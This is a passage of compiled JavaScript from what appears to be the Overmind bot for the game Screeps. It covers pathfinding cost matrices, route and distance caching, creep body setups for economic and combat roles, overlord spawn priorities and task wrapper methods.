        return $.costMatrix(room.name, MatrixTypes.sk, () => {
            const matrix = this.getDefaultMatrix(room).clone();
            const avoidRange = 6;
            _.forEach(room.keeperLairs, lair => {
                for (let dx = -avoidRange; dx <= avoidRange; dx++) {
                    for (let dy = -avoidRange; dy <= avoidRange; dy++) {
                        matrix.set(lair.pos.x + dx, lair.pos.y + dy, 0xfe);
                    }
                }
            });
            return matrix;
        });
    }
    // /* Avoids source keepers in a room */
    // private static getInvisibleSkMatrix(roomName: string): CostMatrix {
    //  let matrix = new PathFinder.CostMatrix();
    //  if (Cartographer.roomType(roomName) == ROOMTYPE_SOURCEKEEPER) {
    //      if (Memory.rooms[roomName] && Memory.rooms[roomName].SKlairs != undefined) {
    //
    //          const avoidRange = 5;
    //          const lairs: RoomPosition[] = _.map(Memory.rooms[roomName].SKlairs!,
    //                                              saved => derefCoords(saved.c, roomName));
    //          _.forEach(lairs, lair => {
    //              for (let dx = -avoidRange; dx <= avoidRange; dx++) {
    //                  for (let dy = -avoidRange; dy <= avoidRange; dy++) {
    //                      matrix.set(lair.x + dx, lair.y + dy, 0xff);
    //                  }
    //              }
    //          });
    //      }
    //  }
    //  return matrix;
    // }
    // In-place CostMatrix manipulation routines =======================================================================
    /**
     * Sets impassible structure positions to 0xff
     */
    static blockImpassibleStructures(matrix, room) {
        _.forEach(room.find(FIND_STRUCTURES), (s) => {
            if (!s.isWalkable) {
                if (s.structureType == STRUCTURE_PORTAL) {
                    matrix.set(s.pos.x, s.pos.y, 0xfe);
                }
                else {
                    matrix.set(s.pos.x, s.pos.y, 0xff);
                }
            }
        });
    }
    /**
     * Sets all creep positions to impassible
     */
    static blockMyCreeps(matrix, room, creeps) {
        const blockCreeps = creeps || room.creeps;
        const blockPositions = _.map(blockCreeps, creep => Overmind.zerg[creep.name] ? Overmind.zerg[creep.name].nextPos
            : creep.pos);
        _.forEach(blockPositions, pos => {
            matrix.set(pos.x, pos.y, CREEP_COST);
        });
    }
    /**
     * Sets hostile creep positions to impassible
     */
    static blockHostileCreeps(matrix, room) {
        _.forEach(room.hostiles, hostile => {
            matrix.set(hostile.pos.x, hostile.pos.y, CREEP_COST);
        });
    }
    /**
     * Sets all creep positions to impassible
     */
    static blockAllCreeps(matrix, room) {
        _.forEach(room.find(FIND_CREEPS), creep => {
            matrix.set(creep.pos.x, creep.pos.y, CREEP_COST);
        });
    }
    /**
     * Sets road positions to 1 if cost is less than 0xfe
     */
    static preferRoads(matrix, room) {
        _.forEach(room.roads, road => {
            if (matrix.get(road.pos.x, road.pos.y) < 0xfe) {
                matrix.set(road.pos.x, road.pos.y, 1);
            }
        });
    }
    /**
     * Sets walkable rampart positions to 1 if cost is less than 0xfe
     */
    static preferRamparts(matrix, room) {
        _.forEach(room.walkableRamparts, rampart => {
            if (matrix.get(rampart.pos.x, rampart.pos.y) < 0xfe) {
                matrix.set(rampart.pos.x, rampart.pos.y, 1);
            }
        });
    }
    /**
     * Explicitly blocks off walls for a room
     */
    static blockImpassibleTerrain(matrix, roomName) {
        const terrain = Game.map.getRoomTerrain(roomName);
        for (let y = 0; y < 50; ++y) {
            for (let x = 0; x < 50; ++x) {
                if (terrain.get(x, y) === TERRAIN_MASK_WALL) {
                    matrix.set(x, y, 0xff);
                }
            }
        }
    }
    /**
     * Transform a CostMatrix such that the cost at each point is transformed to the max of costs in a width x height
     * window (indexed from upper left corner). This requires that terrain be explicitly specified in the matrix!
     */
    static applyMovingMaximum(matrix, width, height) {
        // Since we're moving in increasing order of x, y, we don't need to clone the matrix
        let x, y, dx, dy;
        let maxCost, cost;
        for (x = 0; x <= 50 - width; x++) {
            for (y = 0; y <= 50 - height; y++) {
                maxCost = matrix.get(x, y);
                for (dx = 0; dx <= width - 1; dx++) {
                    for (dy = 0; dy <= height - 1; dy++) {
                        cost = matrix.get(x + dx, y + dy);
                        if (cost > maxCost) {
                            maxCost = cost;
                        }
                    }
                }
                matrix.set(x, y, maxCost);
            }
        }
    }
    static setCostsInRange(matrix, pos, range, cost = 30, add = false) {
        pos = normalizePos(pos);
        const terrain = Game.map.getRoomTerrain(pos.roomName);
        for (let dx = -range; dx <= range; dx++) {
            const x = pos.x + dx;
            if (x < 0 || x > 49)
                continue;
            for (let dy = -range; dy <= range; dy++) {
                const y = pos.y + dy;
                if (y < 0 || y > 49)
                    continue;
                const posTerrain = terrain.get(x, y);
                if (posTerrain === TERRAIN_MASK_WALL) {
                    continue;
                }
                let currentCost = matrix.get(x, y);
                if (currentCost === 0) {
                    if (posTerrain === TERRAIN_MASK_SWAMP) {
                        currentCost += 10;
                    }
                    else {
                        currentCost += 2;
                    }
                }
                if (currentCost >= 0xff || currentCost > cost)
                    continue;
                matrix.set(x, y, add ? Math.min(cost + currentCost, 200) : cost);
            }
        }
    }
    static blockExits(matrix, rangeToEdge = 0) {
        for (let x = rangeToEdge; x < 50 - rangeToEdge; x += 49 - rangeToEdge * 2) {
            for (let y = rangeToEdge; y < 50 - rangeToEdge; y++) {
                matrix.set(x, y, 0xff);
            }
        }
        for (let x = rangeToEdge; x < 50 - rangeToEdge; x++) {
            for (let y = rangeToEdge; y < 50 - rangeToEdge; y += 49 - rangeToEdge * 2) {
                matrix.set(x, y, 0xff);
            }
        }
    }
    static setExitCosts(matrix, roomName, cost, rangeToEdge = 0) {
        const terrain = Game.map.getRoomTerrain(roomName);
        for (let x = rangeToEdge; x < 50 - rangeToEdge; x += 49 - rangeToEdge * 2) {
            for (let y = rangeToEdge; y < 50 - rangeToEdge; y++) {
                if (terrain.get(x, y) != TERRAIN_MASK_WALL) {
                    matrix.set(x, y, cost);
                }
            }
        }
        for (let x = rangeToEdge; x < 50 - rangeToEdge; x++) {
            for (let y = rangeToEdge; y < 50 - rangeToEdge; y += 49 - rangeToEdge * 2) {
                if (terrain.get(x, y) != TERRAIN_MASK_WALL) {
                    matrix.set(x, y, cost);
                }
            }
        }
    }
    static getExitPositions(roomName) {
        const terrain = Game.map.getRoomTerrain(roomName);
        const exitPositions = [];
        for (let x = 0; x < 50; x += 49) {
            for (let y = 0; y < 50; y++) {
                if (terrain.get(x, y) != TERRAIN_MASK_WALL) {
                    exitPositions.push(new RoomPosition(x, y, roomName));
                }
            }
        }
        for (let x = 0; x < 50; x++) {
            for (let y = 0; y < 50; y += 49) {
                if (terrain.get(x, y) != TERRAIN_MASK_WALL) {
                    exitPositions.push(new RoomPosition(x, y, roomName));
                }
            }
        }
        return exitPositions;
    }
    /**
     * Find a viable sequence of rooms to narrow down Pathfinder algorithm
     */
    static findRoute(origin, destination, options = {}) {
        const linearDistance = Game.map.getRoomLinearDistance(origin, destination);
        const restrictDistance = options.restrictDistance || linearDistance + 10;
        const allowedRooms = { [origin]: true, [destination]: true };
        // Determine whether to use highway bias
        let highwayBias = 1;
        if (options.preferHighway) {
            highwayBias = 2.5;
        }
        else if (options.preferHighway != false) {
            // if (linearDistance > 8) {
            //  highwayBias = 2.5;
            // } else {
            //  let oCoords = Cartographer.getRoomCoordinates(origin);
            //  let dCoords = Cartographer.getRoomCoordinates(destination);
            //  if (_.any([oCoords.x, oCoords.y, dCoords.x, dCoords.y], z => z % 10 <= 1 || z % 10 >= 9)) {
            //      highwayBias = 2.5;
            //  }
            // }
        }
        const ret = Game.map.findRoute(origin, destination, {
            routeCallback: (roomName) => {
                const rangeToRoom = Game.map.getRoomLinearDistance(origin, roomName);
                if (rangeToRoom > restrictDistance) { // room is too far out of the way
                    return Number.POSITIVE_INFINITY;
                }
                if (!options.allowHostile && this.shouldAvoid(roomName) &&
                    roomName !== destination && roomName !== origin) { // room is marked as "avoid" in room memory
                    return Number.POSITIVE_INFINITY;
                }
                if (options.preferHighway && Cartographer.roomType(roomName) == ROOMTYPE_ALLEY) {
                    return 1;
                }
                return highwayBias;
            },
        });
        if (!_.isArray(ret)) {
            log.warning(`Movement: couldn't findRoute from ${origin} to ${destination}!`);
        }
        else {
            for (const value of ret) {
                allowedRooms[value.room] = true;
            }
            return allowedRooms;
        }
    }
    /**
     * Serialize a path as a string of move directions
     */
    static serializePath(startPos, path, color = 'orange') {
        let serializedPath = '';
        let lastPosition = startPos;
        for (const position of path) {
            if (position.roomName == lastPosition.roomName) {
                new RoomVisual(position.roomName)
                    .line(position, lastPosition, { color: color, lineStyle: 'dashed' });
                serializedPath += lastPosition.getDirectionTo(position);
            }
            lastPosition = position;
        }
        return serializedPath;
    }
    static nextDirectionInPath(creep) {
        const moveData = creep.memory._go;
        if (!moveData || !moveData.path || moveData.path.length == 0) {
            return;
        }
        return Number.parseInt(moveData.path[0], 10);
    }
    static nextPositionInPath(creep) {
        const nextDir = this.nextDirectionInPath(creep);
        if (!nextDir) {
            return;
        }
        return this.positionAtDirection(creep.pos, nextDir);
    }
    static oppositeDirection(direction) {
        switch (direction) {
            case TOP:
                return BOTTOM;
            case TOP_LEFT:
                return BOTTOM_RIGHT;
            case LEFT:
                return RIGHT;
            case BOTTOM_LEFT:
                return TOP_RIGHT;
            case BOTTOM:
                return TOP;
            case BOTTOM_RIGHT:
                return TOP_LEFT;
            case RIGHT:
                return LEFT;
            case TOP_RIGHT:
                return BOTTOM_LEFT;
        }
    }
    /**
     * Returns a position at a direction from origin
     */
    static positionAtDirection(origin, direction) {
        const offsetX = [0, 0, 1, 1, 1, 0, -1, -1, -1];
        const offsetY = [0, -1, -1, 0, 1, 1, 1, 0, -1];
        const x = origin.x + offsetX[direction];
        const y = origin.y + offsetY[direction];
        if (x > 49 || x < 0 || y > 49 || y < 0) {
            return;
        }
        return new RoomPosition(x, y, origin.roomName);
    }
    static savePath(path) {
        const savedPath = {
            path: path,
            length: path.length,
            tick: Game.time
        };
        const originName = _.first(path).name;
        const destinationName = _.last(path).name;
        if (!Memory.pathing.paths[originName]) {
            Memory.pathing.paths[originName] = {};
        }
        Memory.pathing.paths[originName][destinationName] = savedPath;
    }
    // Distance and path weight calculations ===========================================================================
    /**
     * Calculate and/or cache the length of the shortest path between two points.
     * Cache is probabilistically cleared in Mem
     */
    static distance(arg1, arg2) {
        const [name1, name2] = [arg1.name, arg2.name].sort(); // alphabetize since path is the same in either direction
        if (!Memory.pathing.distances[name1]) {
            Memory.pathing.distances[name1] = {};
        }
        if (!Memory.pathing.distances[name1][name2]) {
            const ret = this.findShortestPath(arg1, arg2);
            if (!ret.incomplete) {
                Memory.pathing.distances[name1][name2] = ret.path.length;
            }
        }
        return Memory.pathing.distances[name1][name2];
    }
    static calculatePathWeight(startPos, endPos, options = {}) {
        _.defaults(options, {
            range: 1,
        });
        const ret = this.findPath(startPos, endPos, options);
        let weight = 0;
        for (const pos of ret.path) {
            if (!pos.room) { // If you don't have vision, assume there are roads
                weight += 1;
            }
            else {
                if (pos.lookForStructure(STRUCTURE_ROAD)) {
                    weight += 1;
                }
                else {
                    const terrain = pos.lookFor(LOOK_TERRAIN)[0];
                    if (terrain == 'plain') {
                        weight += 2;
                    }
                    else if (terrain == 'swamp') {
                        weight += 10;
                    }
                }
            }
        }
        return weight;
    }
    /**
     * Calculates and/or caches the weighted distance for the most efficient path. Weight is sum of tile weights:
     * Road = 1, Plain = 2, Swamp = 10. Cached weights are cleared in Mem occasionally.
     */
    static weightedDistance(arg1, arg2) {
        let pos1, pos2;
        if (arg1.name < arg2.name) { // alphabetize since path lengths are the same either direction
            pos1 = arg1;
            pos2 = arg2;
        }
        else {
            pos1 = arg2;
            pos2 = arg1;
        }
        if (!Memory.pathing.weightedDistances[pos1.name]) {
            Memory.pathing.weightedDistances[pos1.name] = {};
        }
        if (!Memory.pathing.weightedDistances[pos1.name][pos2.name]) {
            Memory.pathing.weightedDistances[pos1.name][pos2.name] = this.calculatePathWeight(pos1, pos2);
        }
        return Memory.pathing.weightedDistances[pos1.name][pos2.name];
    }
    /**
     * Whether another object in the same room can be reached from the current position
     */
    static isReachable(startPos, endPos, obstacles, options = {}) {
        _.defaults(options, {
            ignoreCreeps: true,
            range: 1,
            maxOps: 2000,
            ensurePath: false,
        });
        if (startPos.roomName != endPos.roomName) {
            log.error(`isReachable() should only be used within a single room!`);
            return false;
        }
        const matrix = new PathFinder.CostMatrix();
        _.forEach(obstacles, obstacle => {
            if (hasPos(obstacle)) {
                matrix.set(obstacle.pos.x, obstacle.pos.y, 0xfe);
            }
            else {
                matrix.set(obstacle.x, obstacle.y, 0xfe);
            }
        });
        const callback = (roomName) => roomName == endPos.roomName ? matrix : false;
        const ret = PathFinder.search(startPos, { pos: endPos, range: options.range }, {
            maxOps: options.maxOps,
            plainCost: 1,
            swampCost: 5,
            maxRooms: 1,
            roomCallback: callback,
        });
        if (ret.incomplete) {
            return false;
        }
        else {
            for (const pos of ret.path) {
                if (matrix.get(pos.x, pos.y) > 100) {
                    return false;
                }
            }
        }
        return true;
    }
    /**
     * Like isReachable(), but returns the first position which should be cleared to find a path to destination
     */
    static findBlockingPos(startPos, endPos, obstacles, options = {}) {
        _.defaults(options, {
            ignoreCreeps: true,
            range: 1,
            maxOps: 2000,
            ensurePath: false,
        });
        if (startPos.roomName != endPos.roomName) {
            log.error(`findBlockingPos() should only be used within a single room!`);
            return undefined;
        }
        const matrix = new PathFinder.CostMatrix();
        _.forEach(obstacles, obstacle => {
            if (hasPos(obstacle)) {
                matrix.set(obstacle.pos.x, obstacle.pos.y, 0xfe);
            }
            else {
                matrix.set(obstacle.x, obstacle.y, 0xfe);
            }
        });
        const callback = (roomName) => roomName == endPos.roomName ? matrix : false;
        const ret = PathFinder.search(startPos, { pos: endPos, range: options.range }, {
            maxOps: options.maxOps,
            plainCost: 1,
            swampCost: 5,
            maxRooms: 1,
            roomCallback: callback,
        });
        for (const pos of ret.path) {
            if (matrix.get(pos.x, pos.y) > 100) {
                return pos;
            }
        }
    }
    /**
     * Find the first walkable position in the room, spiraling outward from the center
     */
    static findPathablePosition(roomName, clearance = { width: 1, height: 1 }) {
        const terrain = Game.map.getRoomTerrain(roomName);
        let x, y;
        let allClear;
        for (let radius = 0; radius < 23; radius++) {
            for (let dx = -radius; dx <= radius; dx++) {
                for (let dy = -radius; dy <= radius; dy++) {
                    if (Math.abs(dy) !== radius && Math.abs(dx) !== radius) {
                        continue;
                    }
                    x = 25 + dx;
                    y = 25 + dy;
                    allClear = true;
                    for (let w = 0; w < clearance.width; w++) {
                        for (let h = 0; h < clearance.height; h++) {
                            if (terrain.get(x + w, y + h) === TERRAIN_MASK_WALL) {
                                allClear = false;
                            }
                        }
                    }
                    if (allClear) {
                        return new RoomPosition(x, y, roomName);
                    }
                }
            }
        }
        // Should never reach here!
        return new RoomPosition(-10, -10, 'cannotFindPathablePosition');
    }
};
Pathing = Pathing_1 = __decorate([
    profile
], Pathing);
// Register global instance
global.Pathing = Pathing;

/* Return the cost of an entire array of body parts */
function bodyCost(bodyparts) {
    return _.sum(bodyparts, part => BODYPART_COST[part]);
}
function patternCost(setup) {
    return bodyCost(setup.bodySetup.pattern);
}
/**
 * The CreepSetup class contains methods for flexibly generating creep body arrays when needed for spawning
 */
let CreepSetup = class CreepSetup {
    constructor(roleName, bodySetup = {}) {
        this.role = roleName;
        // Defaults for a creep setup
        _.defaults(bodySetup, {
            pattern: [],
            sizeLimit: Infinity,
            prefix: [],
            suffix: [],
            proportionalPrefixSuffix: false,
            ordered: true,
        });
        this.bodySetup = bodySetup;
    }
    /* Generate the largest body of a given pattern that is producable from a room,
     * subject to limitations from maxRepeats */
    generateBody(availableEnergy) {
        let patternCost, patternLength, numRepeats;
        const prefix = this.bodySetup.prefix;
        const suffix = this.bodySetup.suffix;
        let body = [];
        // calculate repetitions
        if (this.bodySetup.proportionalPrefixSuffix) { // if prefix and suffix are to be kept proportional to body size
            patternCost = bodyCost(prefix) + bodyCost(this.bodySetup.pattern) + bodyCost(suffix);
            patternLength = prefix.length + this.bodySetup.pattern.length + suffix.length;
            const energyLimit = Math.floor(availableEnergy / patternCost); // max number of repeats room can produce
            const maxPartLimit = Math.floor(MAX_CREEP_SIZE / patternLength); // max repetitions resulting in <50 parts
            numRepeats = Math.min(energyLimit, maxPartLimit, this.bodySetup.sizeLimit);
        }
        else { // if prefix and suffix don't scale
            const extraCost = bodyCost(prefix) + bodyCost(suffix);
            patternCost = bodyCost(this.bodySetup.pattern);
            patternLength = this.bodySetup.pattern.length;
            const energyLimit = Math.floor((availableEnergy - extraCost) / patternCost);
            const maxPartLimit = Math.floor((MAX_CREEP_SIZE - prefix.length - suffix.length) / patternLength);
            numRepeats = Math.min(energyLimit, maxPartLimit, this.bodySetup.sizeLimit);
        }
        // build the body
        if (this.bodySetup.proportionalPrefixSuffix) { // add the prefix
            for (let i = 0; i < numRepeats; i++) {
                body = body.concat(prefix);
            }
        }
        else {
            body = body.concat(prefix);
        }
        if (this.bodySetup.ordered) { // repeated body pattern
            for (const part of this.bodySetup.pattern) {
                for (let i = 0; i < numRepeats; i++) {
                    body.push(part);
                }
            }
        }
        else {
            for (let i = 0; i < numRepeats; i++) {
                body = body.concat(this.bodySetup.pattern);
            }
        }
        if (this.bodySetup.proportionalPrefixSuffix) { // add the suffix
            for (let i = 0; i < numRepeats; i++) {
                body = body.concat(suffix);
            }
        }
        else {
            body = body.concat(suffix);
        }
        // return it
        return body;
    }
    getBodyPotential(partType, colony) {
        // let energyCapacity = Math.max(colony.room.energyCapacityAvailable,
        //                            colony.incubator ? colony.incubator.room.energyCapacityAvailable : 0);
        let energyCapacity = colony.room.energyCapacityAvailable;
        if (colony.spawnGroup) {
            const colonies = _.compact(_.map(colony.spawnGroup.memory.colonies, name => Overmind.colonies[name]));
            energyCapacity = _.max(_.map(colonies, colony => colony.room.energyCapacityAvailable));
        }
        const body = this.generateBody(energyCapacity);
        return _.filter(body, (part) => part == partType).length;
    }
};
CreepSetup = __decorate([
    profile
], CreepSetup);

/**
 * A mapping of role types to string constants used for naming creeps and accessing them by role
 */
const Roles = {
    // Civilian roles
    drone: 'drone',
    filler: 'filler',
    claim: 'infestor',
    pioneer: 'pioneer',
    manager: 'manager',
    queen: 'queen',
    scout: 'scout',
    transport: 'transport',
    worker: 'worker',
    upgrader: 'upgrader',
    // Combat roles
    guardMelee: 'broodling',
    // guardRanged: 'mutalisk',
    melee: 'zergling',
    ranged: 'hydralisk',
    healer: 'transfuser',
    dismantler: 'lurker',
};
/**
 * This object contains categorized default body setups for various types of creeps
 */
const Setups = {
    drones: {
        extractor: new CreepSetup(Roles.drone, {
            pattern: [WORK, WORK, CARRY, MOVE],
            sizeLimit: Infinity,
        }),
        miners: {
            default: new CreepSetup(Roles.drone, {
                pattern: [WORK, WORK, CARRY, MOVE],
                sizeLimit: 3,
            }),
            standard: new CreepSetup(Roles.drone, {
                pattern: [WORK, WORK, WORK, WORK, WORK, WORK, CARRY, MOVE, MOVE, MOVE],
                sizeLimit: 1,
            }),
            emergency: new CreepSetup(Roles.drone, {
                pattern: [WORK, WORK, CARRY, MOVE],
                sizeLimit: 1,
            }),
            double: new CreepSetup(Roles.drone, {
                pattern: [WORK, WORK, WORK, WORK, WORK, WORK, CARRY, MOVE, MOVE, MOVE],
                sizeLimit: 2,
            }),
            sourceKeeper: new CreepSetup(Roles.drone, {
                pattern: [WORK, WORK, CARRY, MOVE],
                sizeLimit: 5,
            })
        }
    },
    filler: new CreepSetup(Roles.filler, {
        pattern: [CARRY, CARRY, MOVE],
        sizeLimit: 1,
    }),
    infestors: {
        claim: new CreepSetup(Roles.claim, {
            pattern: [CLAIM, MOVE],
            sizeLimit: 1
        }),
        reserve: new CreepSetup(Roles.claim, {
            pattern: [CLAIM, MOVE],
            sizeLimit: 4,
        }),
        controllerAttacker: new CreepSetup(Roles.claim, {
            pattern: [CLAIM, MOVE],
            sizeLimit: Infinity,
        }),
    },
    pioneer: new CreepSetup(Roles.pioneer, {
        pattern: [WORK, CARRY, MOVE, MOVE],
        sizeLimit: Infinity,
    }),
    managers: {
        default: new CreepSetup(Roles.manager, {
            pattern: [CARRY, CARRY, CARRY, CARRY, MOVE],
            sizeLimit: 3,
        }),
        twoPart: new CreepSetup(Roles.manager, {
            pattern: [CARRY, CARRY, MOVE],
            sizeLimit: 8,
        }),
        stationary: new CreepSetup(Roles.manager, {
            pattern: [CARRY, CARRY],
            sizeLimit: 8,
        }),
        stationary_work: new CreepSetup(Roles.manager, {
            pattern: [WORK, WORK, WORK, WORK, CARRY, CARRY],
            sizeLimit: 8,
        }),
    },
    queens: {
        default: new CreepSetup(Roles.queen, {
            pattern: [CARRY, CARRY, MOVE],
            sizeLimit: Infinity,
        }),
        early: new CreepSetup(Roles.queen, {
            pattern: [CARRY, MOVE],
            sizeLimit: Infinity,
        }),
    },
    scout: new CreepSetup(Roles.scout, {
        pattern: [MOVE],
        sizeLimit: 1,
    }),
    transporters: {
        default: new CreepSetup(Roles.transport, {
            pattern: [CARRY, CARRY, MOVE],
            sizeLimit: Infinity,
        }),
        early: new CreepSetup(Roles.transport, {
            pattern: [CARRY, MOVE],
            sizeLimit: Infinity,
        }),
    },
    workers: {
        default: new CreepSetup(Roles.worker, {
            pattern: [WORK, CARRY, MOVE],
            sizeLimit: Infinity,
        }),
        early: new CreepSetup(Roles.worker, {
            pattern: [WORK, CARRY, MOVE, MOVE],
            sizeLimit: Infinity,
        }),
    },
    upgraders: {
        default: new CreepSetup(Roles.upgrader, {
            pattern: [WORK, WORK, WORK, CARRY, MOVE],
            sizeLimit: Infinity,
        }),
        rcl8: new CreepSetup(Roles.upgrader, {
            pattern: [WORK, WORK, WORK, CARRY, MOVE],
            sizeLimit: 5,
        }),
    }
};
/**
 * This object contains default body setups for various types of combat-related creeps
 */
const CombatSetups = {
    /**
     * Zerglings are melee-only creeps (with exception of sourceKeeper setup)
     */
    zerglings: {
        default: new CreepSetup(Roles.melee, {
            pattern: [ATTACK, MOVE],
            sizeLimit: Infinity,
        }),
        armored: new CreepSetup(Roles.melee, {
            pattern: [TOUGH, ATTACK, ATTACK, ATTACK, MOVE, MOVE, MOVE, MOVE],
            sizeLimit: Infinity,
        }),
        boosted_T3_defense: new CreepSetup(Roles.melee, {
            pattern: [TOUGH, ATTACK, ATTACK, ATTACK, ATTACK, ATTACK, ATTACK, ATTACK, MOVE, MOVE],
            sizeLimit: Infinity,
        }),
        boosted_T3: new CreepSetup(Roles.melee, {
            pattern: [TOUGH, TOUGH, ATTACK, ATTACK, ATTACK, ATTACK, ATTACK, ATTACK, MOVE, MOVE],
            sizeLimit: Infinity,
        }),
        sourceKeeper: new CreepSetup(Roles.melee, {
            pattern: [MOVE, MOVE, MOVE, MOVE, ATTACK, ATTACK, ATTACK, ATTACK, HEAL, MOVE],
            sizeLimit: Infinity,
        }),
    },
    /**
     * Hydralisks are ranged creeps which may have a small amount of healing
     */
    hydralisks: {
        early: new CreepSetup(Roles.ranged, {
            pattern: [RANGED_ATTACK, MOVE],
            sizeLimit: Infinity,
        }),
        default: new CreepSetup(Roles.ranged, {
            pattern: [RANGED_ATTACK, RANGED_ATTACK, RANGED_ATTACK, MOVE, MOVE, MOVE, MOVE, HEAL],
            sizeLimit: Infinity,
        }),
        boosted_T3: new CreepSetup(Roles.ranged, {
            pattern: [TOUGH, TOUGH, RANGED_ATTACK, RANGED_ATTACK, RANGED_ATTACK, RANGED_ATTACK, RANGED_ATTACK,
                MOVE, MOVE, HEAL],
            sizeLimit: Infinity,
        }),
        siege: new CreepSetup(Roles.ranged, {
            pattern: [RANGED_ATTACK, RANGED_ATTACK, MOVE, MOVE, MOVE, MOVE, HEAL, HEAL],
            sizeLimit: Infinity,
        }),
        siege_T3: new CreepSetup(Roles.ranged, {
            pattern: [TOUGH, TOUGH, RANGED_ATTACK, RANGED_ATTACK, RANGED_ATTACK, RANGED_ATTACK,
                MOVE, MOVE, HEAL, HEAL],
            sizeLimit: Infinity,
        }),
        sourceKeeper: new CreepSetup(Roles.ranged, {
            pattern: [MOVE, MOVE, MOVE, MOVE, RANGED_ATTACK, RANGED_ATTACK, RANGED_ATTACK, HEAL, HEAL, MOVE],
            sizeLimit: Infinity,
        }),
    },
    /**
     * Healers (transfusers) are creeps which only do healing
     */
    healers: {
        default: new CreepSetup(Roles.healer, {
            pattern: [HEAL, MOVE],
            sizeLimit: Infinity,
        }),
        armored: new CreepSetup(Roles.healer, {
            pattern: [TOUGH, HEAL, HEAL, HEAL, MOVE, MOVE, MOVE, MOVE],
            sizeLimit: Infinity,
        }),
        boosted_T3: new CreepSetup(Roles.healer, {
            pattern: [TOUGH, TOUGH, HEAL, HEAL, HEAL, HEAL, HEAL, HEAL, MOVE, MOVE],
            sizeLimit: Infinity,
        }),
    },
    /**
     * Broodlings are primarily melee creeps which may have a small amount of healing
     */
    broodlings: {
        early: new CreepSetup(Roles.guardMelee, {
            pattern: [ATTACK, MOVE],
            sizeLimit: Infinity,
        }),
        default: new CreepSetup(Roles.guardMelee, {
            pattern: [TOUGH, ATTACK, ATTACK, ATTACK, MOVE, MOVE, MOVE, MOVE, MOVE, HEAL],
            sizeLimit: Infinity,
        }),
    },
    /**
     * Dismantlers (lurkers) are creeps with work parts for dismantle sieges
     */
    dismantlers: {
        default: new CreepSetup(Roles.dismantler, {
            pattern: [WORK, MOVE],
            sizeLimit: Infinity,
        }),
        armored: new CreepSetup(Roles.dismantler, {
            pattern: [TOUGH, WORK, WORK, WORK, MOVE, MOVE, MOVE, MOVE],
            sizeLimit: Infinity,
        }),
        boosted_T3: new CreepSetup(Roles.dismantler, {
            pattern: [TOUGH, TOUGH, WORK, WORK, WORK, WORK, WORK, WORK, MOVE, MOVE],
            sizeLimit: Infinity,
        }),
    },
};

// Compute a hash of a block of code and register with Overmind
function assimilationLocked(code) {
    Assimilator.validate(code);
}

/**
 * Default ordering for processing spawning requests and prioritizing overlords
 */
let OverlordPriority = {
    emergency: {
        bootstrap: 0
    },
    core: {
        queen: 100,
        manager: 101,
    },
    defense: {
        meleeDefense: 200,
        rangedDefense: 201,
    },
    warSpawnCutoff: 299,
    offense: {
        destroy: 300,
        healPoint: 301,
        siege: 302,
        controllerAttack: 399
    },
    colonization: {
        claim: 400,
        pioneer: 401,
    },
    ownedRoom: {
        firstTransport: 500,
        mine: 501,
        work: 502,
        mineralRCL8: 503,
        transport: 510,
        mineral: 520
    },
    outpostDefense: {
        outpostDefense: 550,
        guard: 551,
    },
    upgrading: {
        upgrade: 600,
    },
    throttleThreshold: 699,
    collectionUrgent: {
        haul: 700
    },
    scouting: {
        stationary: 800,
        randomWalker: 801
    },
    remoteRoom: {
        reserve: 900,
        mine: 901,
        roomIncrement: 5,
    },
    remoteSKRoom: {
        sourceReaper: 1000,
        mineral: 1001,
        mine: 1002,
        roomIncrement: 5,
    },
    collection: {
        haul: 1100
    },
    default: 99999 // Default overlord priority to ensure it gets run last
};

/**
 * Tasks class provides conveient wrappers for dispensing new Task instances
 */
let Tasks = class Tasks {
    static chain(tasks, setNextPos = true) {
        if (tasks.length == 0) {
            // log.error(`Tasks.chain was passed an empty array of tasks!`);
            return null;
        }
        if (setNextPos) {
            for (let i = 0; i < tasks.length - 1; i++) {
                tasks[i].options.nextPos = tasks[i + 1].targetPos;
            }
        }
        // Make the accumulator task from the end and iteratively fork it
        let task = _.last(tasks); // start with last task
        tasks = _.dropRight(tasks); // remove it from the list
        for (let i = (tasks.length - 1); i >= 0; i--) { // iterate over the remaining tasks
            task = task.fork(tasks[i]);
        }
        return task;
    }
    static attack(target, options = {}) {
        return new TaskAttack(target, options);
    }
    static build(target, options = {}) {
        return new TaskBuild(target, options);
    }
    static claim(target, options = {}) {
        return new TaskClaim(target, options);
    }
    static dismantle(target, options = {}) {
        return new TaskDismantle(target, options);
    }
    static drop(target, resourceType = RESOURCE_ENERGY, amount, options = {}) {
        return new TaskDrop(target, resourceType, amount, options);
    }
    // static flee(target: fleeTargetType, options = {} as TaskOptions) {
    //  return new TaskFlee(target, options);
    // }
    static fortify(target, options = {}) {
        return new TaskFortify(target, options);
    }
    static getBoosted(target, boostType, amount, options = {}) {
        return new TaskGetBoosted(target, boostType, amount, options);
    }
    static getRenewed(target, options = {}) {
        return new TaskGetRenewed(target, options);
    }
    static goToRoom(target, options = {}) {
        return new TaskGoToRoom(target, options);
    }
    static harvest(target, options = {}) {
        return new TaskHarvest(target, options);
    }
    static heal(target, options = {}) {
        return new TaskHeal(target, options);
    }
    static meleeAttack(target, options = {}) {
        return new TaskMeleeAttack(target, options);
    }
    static pickup(target, options = {}) {
        return new TaskPickup(target, options);
    }
    static rangedAttack(target, options = {}) {
        return new TaskRangedAttack(target, options);
    }
    static recharge(minEnergy = 0, options = {}) {
        return new TaskRecharge(null, minEnergy, options);
    }
    static repair(target, options = {}) {
        return new TaskRepair(target, options);
    }
    static reserve(target, options = {}) {
        return new TaskReserve(target, options);
    }
    static signController(target, options = {}) {
        return new TaskSignController(target, options);
    }
    static transfer(target, resourceType = RESOURCE_ENERGY, amount, options = {}) {
        return new TaskTransfer(target, resourceType, amount, options);
    }
    static transferAll(target, skipEnergy = false, options = {}) {
        return new TaskTransferAll(target, skipEnergy, options);
    }
    static upgrade(target, options = {}) {
        return new TaskUpgrade(target, options);
    }
    static withdraw(target, resourceType = RESOURCE_ENERGY, amount, options = {}) {
        return new TaskWithdraw(target, resourceType, amount, options);
    }
    static withdrawAll(target, options = {}) {
        return new TaskWithdrawAll(target, options);
    }
};
Tasks = __decorate([
    profile
], Tasks);

function hasColony(initializer) {
    return initializer.colony != undefined;
}
const DEFAULT_PRESPAWN = 50;
const MAX_SPAWN_REQUESTS = 100; // this stops division by zero or related errors from sending infinite requests
const OverlordMemoryDefaults = {};
/**
 * An Overlord is roughly analogous to a process in an OS: it is a generalization of a set of related things that need
 * to be done in a colony, like mining from a site, bootstrapping a new colony, guarding against invaders, or building
